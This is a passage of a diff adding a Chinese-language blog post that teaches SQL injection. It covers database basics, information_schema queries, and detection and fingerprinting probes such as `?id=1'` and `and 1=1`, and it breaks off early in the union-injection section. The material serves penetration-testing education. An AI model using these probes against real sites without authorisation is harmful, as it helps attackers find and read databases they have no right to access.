@@ -1,0 +1,1683 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>SQL注入相关 - Geekby&#39;s Blog</title><meta name="Description" content="SQL注入相关"><meta property="og:title" content="SQL注入相关" />
+<meta property="og:description" content="SQL注入相关" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-01-02T17:01:00+08:00" />
+<meta property="article:modified_time" content="2021-01-02T17:01:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL注入相关"/>
+<meta name="twitter:description" content="SQL注入相关"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/" /><link rel="prev" href="https://www.geekby.site/2020/12/%E5%85%AC%E6%9C%89%E4%BA%91%E5%AE%89%E5%85%A8/" /><link rel="next" href="https://www.geekby.site/2021/01/xss%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "SQL注入相关",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2021\/01\/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "常用, 渗透测试","wordcount":  1801 ,
+        "url": "https:\/\/www.geekby.site\/2021\/01\/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86\/","datePublished": "2021-01-02T17:01:00+08:00","dateModified": "2021-01-02T17:01:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "SQL注入相关"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">SQL注入相关</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a>&nbsp;<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-01-02">2021-01-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1801 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 9 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-数据库相关">1 数据库相关</a>
+      <ul>
+        <li><a href="#11-定义">1.1 定义</a></li>
+        <li><a href="#12-分类">1.2 分类</a></li>
+        <li><a href="#13-基本操作">1.3 基本操作</a></li>
+        <li><a href="#14-元数据表---information_schema">1.4 元数据表 - information_schema</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-sql-注入定义及类型">2 SQL 注入定义及类型</a>
+      <ul>
+        <li><a href="#21-定义">2.1 定义</a></li>
+        <li><a href="#22-分类">2.2 分类</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-判断-sql-注入">3 判断 SQL 注入</a>
+      <ul>
+        <li><a href="#31-经典的单引号判断法">3.1 经典的单引号判断法</a></li>
+        <li><a href="#32-判断注入类型">3.2 判断注入类型</a></li>
+        <li><a href="#33-sql-数据库的类型">3.3 SQL 数据库的类型</a>
+          <ul>
+            <li><a href="#331-通过报错信息">3.3.1 通过报错信息</a></li>
+            <li><a href="#332-数据库标志性信息">3.3.2 数据库标志性信息</a></li>
+            <li><a href="#333-数据库特有库名">3.3.3 数据库特有库名</a></li>
+            <li><a href="#334-数据库特有函数">3.3.4 数据库特有函数</a></li>
+            <li><a href="#335-字符串处理方式">3.3.5 字符串处理方式</a></li>
+            <li><a href="#336-特殊符号及注释">3.3.6 特殊符号及注释</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#4-union-联合查询注入">4 UNION 联合查询注入</a>
+      <ul>
+        <li><a href="#41-原理">4.1 原理</a></li>
+        <li><a href="#42-常用语句">4.2 常用语句</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-时间型盲注--布尔型盲注">5 时间型盲注 &amp; 布尔型盲注</a>
+      <ul>
+        <li><a href="#51-原理示意">5.1 原理示意</a></li>
+        <li><a href="#52-常用函数">5.2 常用函数</a>
+          <ul>
+            <li><a href="#521-编码转换函数">5.2.1 编码转换函数</a></li>
+            <li><a href="#522-条件判断函数">5.2.2 条件判断函数</a></li>
+            <li><a href="#523-截取函数">5.2.3 截取函数</a></li>
+            <li><a href="#524-延时函数">5.2.4 延时函数</a></li>
+            <li><a href="#525-其它函数">5.2.5 其它函数</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#6-报错型注入">6 报错型注入</a>
+      <ul>
+        <li><a href="#61-原理">6.1 原理</a></li>
+        <li><a href="#62-常用函数">6.2 常用函数</a>
+          <ul>
+            <li><a href="#621-updatexml">6.2.1 updatexml</a></li>
+            <li><a href="#622-floor-显错注入">6.2.2 floor 显错注入</a></li>
+            <li><a href="#623-其它显错注入">6.2.3 其它显错注入</a></li>
+            <li><a href="#63-demo">6.3 Demo</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#7-堆叠注入">7 堆叠注入</a></li>
+    <li><a href="#8-oob-注入">8 OOB 注入</a>
+      <ul>
+        <li><a href="#81-带外通道技术定义---out-of-band">8.1 带外通道技术定义 - Out Of Band</a></li>
+        <li><a href="#82-oob-vs-x">8.2 OOB vs. X</a>
+          <ul>
+            <li><a href="#821-oob-vs-inband">8.2.1 OOB vs. Inband</a></li>
+            <li><a href="#822-oob-vs-time-based-blind-injection">8.2.2 OOB vs. Time-based Blind Injection</a></li>
+          </ul>
+        </li>
+        <li><a href="#83-oob-利用函数---load_file-函数">8.3 OOB 利用函数 - load_file 函数</a></li>
+        <li><a href="#84-oob-注入原理">8.4 OOB 注入原理</a></li>
+        <li><a href="#85-扩展---大文本传输">8.5 扩展 - 大文本传输</a></li>
+      </ul>
+    </li>
+    <li><a href="#9-waf-绕过">9 WAF 绕过</a>
+      <ul>
+        <li><a href="#91-and-和-or-绕过">9.1 and 和 or 绕过</a></li>
+        <li><a href="#92-union-过滤绕过">9.2 union 过滤绕过</a></li>
+        <li><a href="#93-where-过滤绕过">9.3 where 过滤绕过</a></li>
+        <li><a href="#94-limit-过滤绕过">9.4 limit 过滤绕过</a></li>
+        <li><a href="#95-group-by-过滤绕过">9.5 group by 过滤绕过</a></li>
+        <li><a href="#96-select-及单引号过滤绕过">9.6 select 及单引号过滤绕过</a></li>
+        <li><a href="#97-hexunhex-及-substr-过滤绕过---binary">9.7 hex、unhex 及 substr 过滤绕过 - binary</a></li>
+        <li><a href="#98-空格过滤绕过">9.8 空格过滤绕过</a></li>
+        <li><a href="#99-等号过滤绕过">9.9 等号过滤绕过</a></li>
+        <li><a href="#910-其它类型的绕过">9.10 其它类型的绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#10-二次注入">10 二次注入</a>
+      <ul>
+        <li><a href="#101-原理">10.1 原理</a></li>
+      </ul>
+    </li>
+    <li><a href="#11-基于约束的-sql-攻击">11 基于约束的 SQL 攻击</a>
+      <ul>
+        <li><a href="#111-原理">11.1 原理</a></li>
+        <li><a href="#112-实例">11.2 实例</a></li>
+      </ul>
+    </li>
+    <li><a href="#12-sql-注入命令执行">12 SQL 注入命令执行</a>
+      <ul>
+        <li><a href="#121-sql-注入写文件">12.1 SQL 注入写文件</a>
+          <ul>
+            <li><a href="#1211-union-select-后写入">12.1.1 union select 后写入</a></li>
+            <li><a href="#1212-行分隔符写入">12.1.2 行分隔符写入</a></li>
+          </ul>
+        </li>
+        <li><a href="#122-用户自定义函数---udf">12.2 用户自定义函数 - UDF</a>
+          <ul>
+            <li><a href="#1221-udf-库文件获取">12.2.1 UDF 库文件获取</a></li>
+            <li><a href="#1222-udf-库文件写入">12.2.2 UDF 库文件写入</a></li>
+            <li><a href="#1223-dumpfile-vs-outfile">12.2.3 dumpfile vs. outfile</a></li>
+            <li><a href="#1224-自定义函数">12.2.4 自定义函数</a></li>
+          </ul>
+        </li>
+        <li><a href="#123-自动化工具">12.3 自动化工具</a></li>
+      </ul>
+    </li>
+    <li><a href="#13-注入技巧">13 注入技巧</a>
+      <ul>
+        <li><a href="#131-select-注入">13.1 SELECT 注入</a>
+          <ul>
+            <li><a href="#1311-注入点在-select_expr">13.1.1 注入点在 select_expr</a></li>
+            <li><a href="#1312-注入点在-table_reference">13.1.2 注入点在 table_reference</a></li>
+            <li><a href="#1313-注入点在-where-或-having-后">13.1.3 注入点在 WHERE 或 HAVING 后</a></li>
+            <li><a href="#1314-注入点在-group-by-或-order-by-后">13.1.4 注入点在 GROUP BY 或 ORDER BY 后</a>
+              <ul>
+                <li><a href="#13141-利用报错">13.1.4.1 利用报错</a></li>
+                <li><a href="#13142-利用延时">13.1.4.2 利用延时</a></li>
+                <li><a href="#13143-利用----位运算符进行-order-by">13.1.4.3 利用 &amp; | ^ 位运算符进行 order by</a></li>
+                <li><a href="#13144-利用括号闭合进行联合查询">13.1.4.4 利用括号闭合进行联合查询</a></li>
+              </ul>
+            </li>
+            <li><a href="#1315-注入点在-limit-后">13.1.5 注入点在 LIMIT 后</a></li>
+          </ul>
+        </li>
+        <li><a href="#132-insert-注入">13.2 INSERT 注入</a>
+          <ul>
+            <li><a href="#1321-注入点位于-tbl_name">13.2.1 注入点位于 tbl_name</a></li>
+            <li><a href="#1322-注入点位于-values">13.2.2 注入点位于 VALUES</a>
+              <ul>
+                <li><a href="#13221-insert-延时">13.2.2.1 INSERT 延时</a></li>
+                <li><a href="#13222-insert-报错">13.2.2.2 INSERT 报错</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#133-update-注入">13.3 UPDATE 注入</a>
+          <ul>
+            <li><a href="#1331-update-报错">13.3.1 UPDATE 报错</a></li>
+            <li><a href="#1332-update-延时">13.3.2 UPDATE 延时</a></li>
+          </ul>
+        </li>
+        <li><a href="#134-delete-注入">13.4 DELETE 注入</a>
+          <ul>
+            <li><a href="#1341-delete-延时">13.4.1 DELETE 延时</a></li>
+            <li><a href="#1342-delete-报错">13.4.2 DELETE 报错</a></li>
+          </ul>
+        </li>
+        <li><a href="#135-descibe-注入">13.5 DESCIBE 注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#14-nosql-注入">14 NoSQL 注入</a>
+      <ul>
+        <li><a href="#141-定义">14.1 定义</a></li>
+        <li><a href="#142-注入原理一">14.2 注入原理一</a></li>
+        <li><a href="#143-注入原理二">14.3 注入原理二</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="1-数据库相关">1 数据库相关</h2>
+<h3 id="11-定义">1.1 定义</h3>
+<blockquote>
+<p>数据库是一个存储数据的仓库，</p>
+<p>以一定方式存储在一起、能与多个用户共享、具有尽可能小的冗余度，与应用程序彼此独立的数据集合</p>
+</blockquote>
+<h3 id="12-分类">1.2 分类</h3>
+<p><strong>关系型数据库 - SQL</strong></p>
+<blockquote>
+<p>类似表格，表与表之前存在复杂的关系</p>
+</blockquote>
+<p>MySQL、SQLServer 等</p>
+<p><strong>非关系型数据库 - NoSQL</strong></p>
+<blockquote>
+<p>Key - Value 形式，简化数据库结构、避免冗余。</p>
+</blockquote>
+<p>MangoDB、Redis、memcached</p>
+<h3 id="13-基本操作">1.3 基本操作</h3>
+<p><strong>查看数据库</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">show</span><span class="w"> </span><span class="n">databases</span><span class="p">();</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用数据库</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">use</span><span class="w"> </span><span class="n">information_schema</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看当前使用数据库</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="k">database</span><span class="p">();</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看数据表</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">show</span><span class="w"> </span><span class="n">tables</span><span class="p">();</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看数据库版本</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>使用当前数据库的用户</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">();</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看数据库路径</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">datadir</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看安装路径</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">basedir</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>查看系统类型</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">version_compile_os</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h3 id="14-元数据表---information_schema">1.4 元数据表 - information_schema</h3>
+<p><strong>information_schema</strong></p>
+<p>是信息数据库其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。对于 Web 渗透过程中用途很大</p>
+<p><strong>SCHEMATA</strong> 表：提供了当前 MySQL 实例中所有数据库的信息。是 show databases 的结果取之此表。</p>
+<p><strong>TABLES</strong> 表：提供了关于数据库中的表的信息(包括视图)。</p>
+<p><strong>COLUMNS</strong> 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</p>
+<p><strong>通过元数据表查询数据表</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;test&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p><strong>通过元数据表查询数据列</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;table1&#39;</span><span class="p">;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2-sql-注入定义及类型">2 SQL 注入定义及类型</h2>
+<h3 id="21-定义">2.1 定义</h3>
+<blockquote>
+<p>发生于<code>应用程序与数据库层</code>的安全漏洞</p>
+</blockquote>
+<p>网站内部直接发送的 SQL 请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造 SQL 语句，如果用输入的数据被构造成恶意 SQL 代码，Web 应用又未对动态构造的 SQL 语句使用的参数进行审查，则会带来安全风险。</p>
+<p><strong>形成原因</strong></p>
+<ol>
+<li>用户能够控制传参</li>
+<li>SQL 语句中拼接了用户传参的内容</li>
+<li>拼接后的 SQL 语句在数据库中执行</li>
+</ol>
+<p>总结：用户输入的数据作为代码执行</p>
+<h3 id="22-分类">2.2 分类</h3>
+<p>布尔型注入</p>
+<p>联合查询注入</p>
+<p>时间型注入</p>
+<p>报错型注入</p>
+<p>堆叠注入(多语句查询注入)</p>
+<h2 id="3-判断-sql-注入">3 判断 SQL 注入</h2>
+<div class="details admonition question open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-question-circle fa-fw"></i>问题<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>判断该访问目标 URL 是否存在 SQL 注入？</p>
+<p>如果存在 SQL 注入，那么属于哪种 SQL 注入？</p>
+<p>判断 SQL 注入后端数据库的类型？</p>
+</div>
+        </div>
+    </div>
+<h3 id="31-经典的单引号判断法">3.1 经典的单引号判断法</h3>
+<p><code>http://xxx/text.php?id=1'</code></p>
+<p>如果页面返回错误，则存在 SQL 注入；原因是无论字符型还是整型都会因为单引号个数不匹配而报错。</p>
+<h3 id="32-判断注入类型">3.2 判断注入类型</h3>
+<p><strong>数字型</strong></p>
+<p>通常构造 <code>and 1=1</code> 以及 <code>and 1=2</code> 来判断</p>
+<p><strong>运算符判断法：</strong></p>
+<p>这种判断方法的关键在于通过加、减、乘、除等运算，判断输入参数附近有没有引号包裹，再通过一些通用的攻击手段，获取数据库的敏感信息。</p>
+<p><strong>字符型</strong></p>
+<p>通常构造 <code>and '1'='1</code> 以及 <code>and '1'='2</code> 来判断</p>
+<p><strong>类型转换判断法：</strong></p>
+<p>在 MySQL 中，等号两边如果类型不一致，则会发生强制转换。当数字与字符串数据比较时，字符串将被转换为数字，再进行比较。字符串 1 与数字相等；字符串 1a 被强制转换成 1，与 1 相等；字符串 a 被强制转换成 0 所以与 0 相等。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108155925.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108155925.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108155925.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108155925.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108155925.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108155925.png-water_print" /></p>
+<p>按照这个特性，我们容易判断输入点是否为字符型，也就是是否有引号（可能是单引号也可能是双引号，绝大多数情况下是单引号）包裹。访问 <code>?id=3-2</code>，页面为空，不是数字型，可能是字符型。继续尝试访问 <code>?id=2a</code>，成功返回结果，说明是字符型。</p>
+<h3 id="33-sql-数据库的类型">3.3 SQL 数据库的类型</h3>
+<h4 id="331-通过报错信息">3.3.1 通过报错信息</h4>
+<ul>
+<li>MySQL</li>
+</ul>
+<blockquote>
+<p>you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x</p>
+</blockquote>
+<ul>
+<li>Access</li>
+</ul>
+<blockquote>
+<p>Microsoft JET Database&hellip;</p>
+</blockquote>
+<ul>
+<li>MSSQL</li>
+</ul>
+<blockquote>
+<p>Microsoft ODBC Database&hellip;</p>
+</blockquote>
+<h4 id="332-数据库标志性信息">3.3.2 数据库标志性信息</h4>
+<p><strong>sql server</strong>：<code>select @@version--</code></p>
+<p><strong>Oracle</strong>：<code>select banner from v$version</code></p>
+<p><strong>mysql</strong>：<code>select @@version，version()-- ，length(user)&gt;0正常</code></p>
+<p><strong>postgresql</strong>：<code>select version()--</code></p>
+<h4 id="333-数据库特有库名">3.3.3 数据库特有库名</h4>
+<p><strong>MySQL</strong>：information_schema</p>
+<p><strong>Access</strong>：mysysobjects</p>
+<p><strong>Oracle</strong>：sys.user_tables</p>
+<p><strong>MSSQL</strong>：sysobjects</p>
+<h4 id="334-数据库特有函数">3.3.4 数据库特有函数</h4>
+<p><strong>sql server</strong>：@@pack_received @@rowcount</p>
+<p><strong>mysql</strong>：connection_id()、last_insert_id()、row_count()</p>
+<p><strong>orcale</strong>：bitand(1,1)</p>
+<p><strong>postgresql</strong>： select extract(dow from now())</p>
+<p>在 mssql 中可以调用 substring。oracle 则只可调用 substr</p>
+<h4 id="335-字符串处理方式">3.3.5 字符串处理方式</h4>
+<p><strong>mssql</strong>：<code>id=1 and 'a'+'b'='ab'</code></p>
+<p><strong>mysql</strong>：<code>id=1 and 'a'+'b'='ab' ， 'ab'=concat('a','b')</code></p>
+<p><strong>oracle</strong>：<code>id=1 and 'a'+'b'='a'||'b' ，'ab'=concat('a','b')</code></p>
+<p><strong>postgresql</strong>：<code>id=1 and 'a'+'b'='a'||'b' ,'ab'=concat('a','b')</code></p>
+<h4 id="336-特殊符号及注释">3.3.6 特殊符号及注释</h4>
+<ol>
+<li><code>null</code> 和 <code>%00</code> 是 access 支持的注释</li>
+<li><code>#</code> 是 MySQL 中的注释符，返回错误说明该注入点可能不是 MySQL，另外也支持<code>-- </code>，和 <code>/* */</code> 注释</li>
+<li><code>--</code> 和 <code>/* */</code> 是 Oracle，SQL server 和 MySQL 支持的注释符，如果正常，说明可能就是这三个数据库其中之一。</li>
+<li><code>;</code> 是子句查询标识符，在 Oracle 中不支持多行查询，返回错误，很可能是 Oracle 数据库。</li>
+</ol>
+<h2 id="4-union-联合查询注入">4 UNION 联合查询注入</h2>
+<h3 id="41-原理">4.1 原理</h3>
+<p>union 操作符用于合并两个查询或者多个 select 语句的结果集</p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>信息<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">UNION 内部的 select 语句必须有相同数量的列。</div>
+        </div>
+    </div>
+<p>通过 UNION 联合查询，直接将查询的结果返回给页面，是最简单的一种注入方式。</p>
+<h3 id="42-常用语句">4.2 常用语句</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
